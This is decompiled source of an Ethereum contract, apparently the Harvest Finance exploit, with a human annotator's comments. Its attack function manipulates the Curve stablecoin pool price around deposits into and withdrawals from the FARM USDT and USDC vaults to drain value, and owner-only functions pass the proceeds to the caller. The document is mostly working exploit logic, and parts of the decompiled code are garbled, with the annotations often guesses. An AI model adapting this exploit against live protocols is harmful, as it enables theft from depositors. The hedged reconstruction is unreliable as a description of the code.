#
#  Panoramix v4 Oct 2019 
#  Decompiled source of 0xc6028a9Fa486F52efd2B95B949AC630d287CE0aF
# 
#  Let's make the world open source 
# 
#
#  I failed with these: 
#  - init()
#  - _fallback()
#  All the rest is below.
#

const unknown12f08b50 = (ext_call.return_data
const unknown8074423e = (ext_call.return_data
const unknownb4185583 = (ext_call.return_data

def storage:
  stor0 is uint256 at storage 0
  usdc_threshold is uint256 at storage 1
  usdt_threshold is uint256 at storage 2
  stor3 is uint256 at storage 3
  stor4 is uint256 at storage 4
  owner is addr at storage 5
  stor6 is uint32 at storage 6
  stor6 is uint256 at storage 6
  stor7 is uint32 at storage 7
  stor7 is uint256 at storage 7

#
#  Regular functions
#

def set_usdc_threshold(uint256 _param1): # not payable
  require calldata.size - 4 >= 32
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  usdc_threshold = _param1


def set_usdt_threshold(uint256 _param1): # not payable
  require calldata.size - 4 >= 32
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  usdt_threshold = _param1


def call_uniswap_permit(): # not payable
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'

  # This is uniswap contract address UniswapV2Pair
  # This is very likely the function permit() external but the order is mixed up
  #    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {
  #      require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');
  #      bytes32 digest = keccak256(
  #          abi.encodePacked(
  #              '\x19\x01',
  #              DOMAIN_SEPARATOR,
  #              keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
  #          )
  #      );
  #      address recoveredAddress = ecrecover(digest, v, r, s);
  #      require(recoveredAddress != address(0) && recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');
  #      _approve(owner, spender, value);
  #  }
  require ext_code.size(0xd4a11d5eeaac28ec3f61d100daf4d40471f1852)
  call 0x0d4a11d5eeaac28ec3f61d100daf4d40471f1852.0x22c0d9f with:
       gas gas_remaining wei
      args 0, 0, 5 * 10^13, this.address, 128, 1, '1'
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]


def check_threshold(): # not payable
  # CRVStrategyStableMainnet for USDT Strategy 
  # https://etherscan.io/address/0x1c47343ea7135c2ba3b2d24202ad960adafaa81c
  require ext_code.size(0x1c47343ea7135c2ba3b2d24202ad960adafaa81c)

  # Calls a function with no arguments
  # Very likely the depositArbCheck function on the contract
  # function depositArbCheck() public view returns(bool) {
  #   uint256 currentPrice = underlyingValueFromYCrv(ycrvUnit);
  #     if (currentPrice < curvePriceCheckpoint) {
  #       return currentPrice.mul(100).div(curvePriceCheckpoint) > 100 - arbTolerance;
  #     } else {
  #       return currentPrice.mul(100).div(curvePriceCheckpoint) < 100 + arbTolerance;
  #     }
  #   }
  static call 0x1c47343ea7135c2ba3b2d24202ad960adafaa81c.0x45d01e4a with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Calls the Tether Token to get balanceOf contract owner where owner is 
  # https://etherscan.io/address/0x1c47343ea7135c2ba3b2d24202ad960adafaa81c
  # which is CRVStrategyStableMainnet for USDT Strategy
  require return_data.size >= 32
  require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
  static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
          gas gas_remaining wei
         args 0x1c47343ea7135c2ba3b2d24202ad960adafaa81c
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is the yUSDT (iearn USDT) contract
  # https://etherscan.io/address/0x83f798e925bcd4017eb265844fddabb448f1707d
  # I am not sure which function this is but it's likely a query without arguments
  require return_data.size >= 32
  require ext_code.size(0x83f798e925bcd4017eb265844fddabb448f1707d)
  static call 0x83f798e925bcd4017eb265844fddabb448f1707d.0x77c7b8fc with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is the Curve.fi vyper contract
  # https://etherscan.io/address/0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51
  # I'm not sure which function this is
  # It's probably getting a value for maybe the usdt/usdc pair here
  require return_data.size >= 32
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  static call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0x65a80d8 with:
          gas gas_remaining wei
         args 2
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is the USDC contract
  # https://etherscan.io/address/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
  # calls the USDC contract to get balanceOf of the current deployed contract
  require return_data.size >= 32
  require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
  static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is some parameter to determine whether one of the returns is above some threshold
  require return_data.size >= 32
  if 13 * 10^12 > 120 * ext_call.return_data * ext_call.return_data / 10^18 / 100:
      return (ext_call.return_data > 13 * 10^12)
  return (ext_call.return_data > 120 * ext_call.return_data * ext_call.return_data / 10^18 / 100)

def deposit_and_withdraw_usdt_farm_vault(uint256 _param1): # not payable
  # Calls curve.fi stablecoin pool
  # https://etherscan.io/address/0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51
  # I am unsure which function this is
  require calldata.size - 4 >= 32
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
       gas gas_remaining wei
      args 0, 1, 2, _param1, 0
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  
  # Calls the Tether Token to get balanceOf contract owner where owner is the current contract address 
  # https://etherscan.io/address/0x1c47343ea7135c2ba3b2d24202ad960adafaa81c 
  require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
  static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Calls the FARM_USDT vault and deposits USDT based on the previous tether balance obtained
  # https://etherscan.io/address/0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c
  require return_data.size >= 32
  require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
  call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.deposit(uint256 amount) with:
       gas gas_remaining wei
      args (ext_call.return_data * _param1 / 1000))
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is the Curve.fi vyper contract
  # https://etherscan.io/address/0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51
  # I'm not sure which function this is
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
       gas gas_remaining wei
      args 0, 2, 1, 1001 * _param1 / 1000, 0
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Calls the FARM_USDT vault and gets balance
  require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
  static call 0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
      
  # Withdraws from the FARM_USDT vault
  require return_data.size >= 32
  require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
  call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.withdraw(uint256 amount) with:
       gas gas_remaining wei
      args ext_call.return_data[0]
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

def deposit_and_withdraw_usdc_farm_vault(uint256 _param1): # not payable
  # This is the Curve.fi vyper contract
  # https://etherscan.io/address/0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51
  # I'm not sure which function this is
  require calldata.size - 4 >= 32
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
       gas gas_remaining wei
      args 0, 2, 1, _param1, 0
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # This is the USDC contract
  # https://etherscan.io/address/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
  # calls the USDC contract to get balanceOf of the current deployed contract
  require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
  static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Deposit USDC into the USDC farm vault
  require return_data.size >= 32
  require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
  call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.deposit(uint256 amount) with:
       gas gas_remaining wei
      args (ext_call.return_data * _param1 / 1000))
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Vyper Curve.fi stablecoin pool function
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
       gas gas_remaining wei
      args 0, 1, 2, 1001 * _param1 / 1000, 0
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  
  # Gets balance of USDC pool
  require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
  static call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Withdraws from USDC pool
  require return_data.size >= 32
  require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
  call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.withdraw(uint256 amount) with:
       gas gas_remaining wei
      args ext_call.return_data[0]
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

def exit_into_eth(): # not payable
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'

  # can't find this
  require ext_code.size(0xd4a11d5eeaac28ec3f61d100daf4d40471f1852)
  static call 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852.getReserves() with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >= 96
  stor3 = ext_call.return_data[18 len 14]
  stor4 = ext_call.return_data[50 len 14]

  # USDC strategy CRVStrategyStableMainnet
  # https://etherscan.io/address/0xd55ada00494d96ce1029c201425249f9dfd216cc#code
  require ext_code.size(0xd55ada00494d96ce1029c201425249f9dfd216cc)
  static call 0xd55ada00494d96ce1029c201425249f9dfd216cc.0x45d01e4a with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # USDC token contract, get balance of owner
  # https://etherscan.io/address/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#code
  require return_data.size >= 32
  require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
  static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
          gas gas_remaining wei
         args 0xd55ada00494d96ce1029c201425249f9dfd216cc
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # iearn usdc (yusdc) contract
  # https://etherscan.io/address/0xd6ad7a6750a7593e092a9b218d66c0a814a3436e
  require return_data.size >= 32
  require ext_code.size(0xd6ad7a6750a7593e092a9b218d66c0a814a3436e)
  static call 0xd6ad7a6750a7593e092a9b218d66c0a814a3436e.0x77c7b8fc with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

  # Vyper Curve.fi stablecoin pool function, probably getting some swap value
  require return_data.size >= 32
  require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
  static call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0x65a80d8 with:
          gas gas_remaining wei
         args 1
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >= 32

  stor0 = (ext_call.return_data * ext_call.return_data / 10^18) + 10^12

  # Can't find this
  require ext_code.size(0xd4a11d5eeaac28ec3f61d100daf4d40471f1852)
  call 0x0d4a11d5eeaac28ec3f61d100daf4d40471f1852.0x22c0d9f with:
       gas gas_remaining wei
      args 0, ext_call.return_datauint32(this.address), 128, 2, '22'
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  
  # WETH contract, withdraws ETH
  require ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
  call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.withdraw(uint256 amount) with:
       gas gas_remaining wei
      args 20 * 10^18
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  call caller with:
     value 20 * 10^18 wei
       gas 0 wei

def transfer_usdc_and_usdt_balance(): # not payable
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'

  # USDC contract, gets balance 
  require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
  static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
          gas gas_remaining wei
         args this.address
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  
  # USDC token contract again, calls transfer function
  require return_data.size >= 32
  if not ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48):
      revert with 0, 'Address: call to non-contract'
  mem[260 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0 len 28]
  call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 with:
     funct uint32(stor7)
       gas gas_remaining wei
      args Mask(480, -256, ext_call.return_data << 256, mem[324 len 4]
  
  # Safety checks before running transfer of USDT
  # Calls USDT contract
  if not return_data.size:
      if not ext_call.success:
          revert with transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0]
      if not transfer(address to, uint256 value), Mask(224, 0, stor7):
          revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]

      # Gets USDT balance of owner and transfers
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
          revert with 0, 'Address: call to non-contract'
      mem[424 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0 len 28]
      call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
         funct uint32(stor7)
           gas gas_remaining wei
          args Mask(480, -256, ext_call.return_data << 256, mem[488 len 4]
      if not return_data.size:
          if not ext_call.success:
              revert with transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0]
          if not transfer(address to, uint256 value), Mask(224, 0, stor7):
              revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[534 len 22]
      else:
          # Failure management
          mem[456 len return_data.size] = ext_call.return_data[0 len return_data.size]
          if not ext_call.success:
              if return_data.size:
                  revert with ext_call.return_data[0 len return_data.size]
              revert with 0, 'SafeERC20: low-level call failed'
          if return_data.size:
              require return_data.size >= 32
              if not mem[456]:
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[ceil32(return_data.size) + 535 len 22]
  else:
      # try to execute USDT transfer if USDC transfer fails
      mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
      if not ext_call.success:
          if return_data.size:
              revert with ext_call.return_data[0 len return_data.size]
          revert with 0, 'SafeERC20: low-level call failed'
      if return_data.size:
          require return_data.size >= 32
          if not mem[292]:
              revert with 0, 
                          32,
                          42,
                          0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                          mem[ceil32(return_data.size) + 371 len 22]
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
          revert with 0, 'Address: call to non-contract'
      mem[ceil32(return_data.size) + 425 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0 len 28]
      call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
         funct uint32(stor7)
           gas gas_remaining wei
          args Mask(480, -256, ext_call.return_data << 256, mem[ceil32(return_data.size) + 489 len 4]
      if not return_data.size:
          if not ext_call.success:
              revert with transfer(address to, uint256 value), Mask(224, 0, stor7), uint32(stor7), ext_call.return_data[0]
          if not transfer(address to, uint256 value), Mask(224, 0, stor7):
              revert with 0, 
                          32,
                          42,
                          0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                          mem[ceil32(return_data.size) + 535 len 22]
      else:
          mem[ceil32(return_data.size) + 457 len return_data.size] = ext_call.return_data[0 len return_data.size]
          if not ext_call.success:
              if return_data.size:
                  revert with ext_call.return_data[0 len return_data.size]
              revert with 0, 
                          'SafeERC20: low-level call failed',
                          mem[(2 * ceil32(return_data.size)) + 526 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
          if return_data.size:
              require return_data.size >= 32
              if not mem[ceil32(return_data.size) + 457]:
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[(2 * ceil32(return_data.size)) + 536 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]

def transfer_usdt_usdc_2(): # not payable
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'

  # Try to transfer USDC
  if not ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48):
      revert with 0, 'Address: call to non-contract'
  mem[260 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 3026
  call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 with:
     funct uint32(stor6)
       gas gas_remaining wei
      args 0xbd20000000000000000000000000000000000000000000000000000000000000000, mem[324 len 4]

   # Try to transfer USDT
  if not return_data.size:
      if not ext_call.success:
          revert with transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 13 * 10^12
      if not transfer(address to, uint256 value), Mask(224, 0, stor6):
          revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]
      if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
          revert with 0, 'Address: call to non-contract'

      mem[424 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 2561
      mem[488 len 0] = 0

      call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
         funct uint32(stor6)
           gas gas_remaining wei
          args Mask(480, -256, transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 2561) << 256, mem[488 len 4]
      if not return_data.size:
          if not ext_call.success:
              revert with transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 13 * 10^12
          if not transfer(address to, uint256 value), Mask(224, 0, stor6):
              revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[534 len 22]
      else:
          mem[456 len return_data.size] = ext_call.return_data[0 len return_data.size]
          if not ext_call.success:
              if return_data.size:
                  revert with ext_call.return_data[0 len return_data.size]
              revert with 0, 'SafeERC20: low-level call failed'
          if return_data.size:
              require return_data.size >= 32
              if not mem[456]:
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[ceil32(return_data.size) + 535 len 22]
  else:
      mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
      if not ext_call.success:
          if return_data.size:
              revert with ext_call.return_data[0 len return_data.size]
          revert with 0, 'SafeERC20: low-level call failed'
      if not return_data.size:
          if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
              revert with 0, 'Address: call to non-contract'
          mem[ceil32(return_data.size) + 425 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 2561
          mem[ceil32(return_data.size) + 489 len 0] = 0
          call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
             funct uint32(stor6)
               gas gas_remaining wei
              args Mask(480, -256, transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 2561) << 256, mem[ceil32(return_data.size) + 489 len 4]
          if not return_data.size:
              if not ext_call.success:
                  revert with transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 13 * 10^12
              if not transfer(address to, uint256 value), Mask(224, 0, stor6):
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[ceil32(return_data.size) + 535 len 22]
          else:
              mem[ceil32(return_data.size) + 457 len return_data.size] = ext_call.return_data[0 len return_data.size]
              if not ext_call.success:
                  if return_data.size:
                      revert with ext_call.return_data[0 len return_data.size]
                  revert with 0, 'SafeERC20: low-level call failed'
              if return_data.size:
                  require return_data.size >= 32
                  if not mem[ceil32(return_data.size) + 457]:
                      revert with 0, 
                                  32,
                                  42,
                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                  mem[(2 * ceil32(return_data.size)) + 536 len 22]
      else:
          require return_data.size >= 32
          if not mem[292]:
              revert with 0, 
                          32,
                          42,
                          0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                          mem[ceil32(return_data.size) + 371 len 22]
          if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
              revert with 0, 'Address: call to non-contract'
          mem[ceil32(return_data.size) + 425 len 64] = transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 2561
          call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
             funct uint32(stor6)
               gas gas_remaining wei
              args 0xa010000000000000000000000000000000000000000000000000000000000000000, mem[ceil32(return_data.size) + 489 len 4]
          if not return_data.size:
              if not ext_call.success:
                  revert with transfer(address to, uint256 value), Mask(224, 0, stor6), uint32(stor6), 13 * 10^12
              if not transfer(address to, uint256 value), Mask(224, 0, stor6):
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[ceil32(return_data.size) + 535 len 22]
          else:
              mem[ceil32(return_data.size) + 457 len return_data.size] = ext_call.return_data[0 len return_data.size]
              if not ext_call.success:
                  if return_data.size:
                      revert with ext_call.return_data[0 len return_data.size]
                  revert with 0, 
                              'SafeERC20: low-level call failed',
                              mem[(2 * ceil32(return_data.size)) + 526 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
              if return_data.size:
                  require return_data.size >= 32
                  if not mem[ceil32(return_data.size) + 457]:
                      revert with 0, 
                                  32,
                                  42,
                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                  mem[(2 * ceil32(return_data.size)) + 536 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]

def attack(array _param1): # not payable
  require calldata.size - 4 >= 128
  require _param1 <= 4294967296
  require _param1 + 36 <= calldata.size
  require _param1.length <= 4294967296 and _param1 + _param1.length + 36 <= calldata.size

  if _param1.length == 1:
      # Exploit harvest USDT strategy
      require ext_code.size(0x1c47343ea7135c2ba3b2d24202ad960adafaa81c)
      static call 0x1c47343ea7135c2ba3b2d24202ad960adafaa81c.0x45d01e4a with:
              gas gas_remaining wei

      # Calls usdt contract
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args 0x1c47343ea7135c2ba3b2d24202ad960adafaa81c

      # calls yusdt contract 
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      require ext_code.size(0x83f798e925bcd4017eb265844fddabb448f1707d)
      static call 0x83f798e925bcd4017eb265844fddabb448f1707d.0x77c7b8fc with:
              gas gas_remaining wei

      # Calls the Curve.fi
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      static call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0x65a80d8 with:
              gas gas_remaining wei
             args 2
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # gets usdt balance
      require return_data.size >= 32
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # calls curve.fi again
      require return_data.size >= 32
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
          args 0, 1, 2, (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Checks usdt balance again
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Deposits in to FARM_USDT vault 
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.deposit(uint256 amount) with:
           gas gas_remaining wei
          args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000))
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Calls curve.fi agan
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
          args 0, 2, 1, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Gets balance in FARM_USDT
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      static call 0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Withdraw from FARM_USDT
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.withdraw(uint256 amount) with:
           gas gas_remaining wei
          args ext_call.return_data[0]
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Calls curve.fi 
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
          args 0, 1, 2, (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Checks usdt balance again
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Deposits in FARM_USDT again
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.deposit(uint256 amount) with:
           gas gas_remaining wei
          args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000))
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Calls curve.fi yvault swap
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
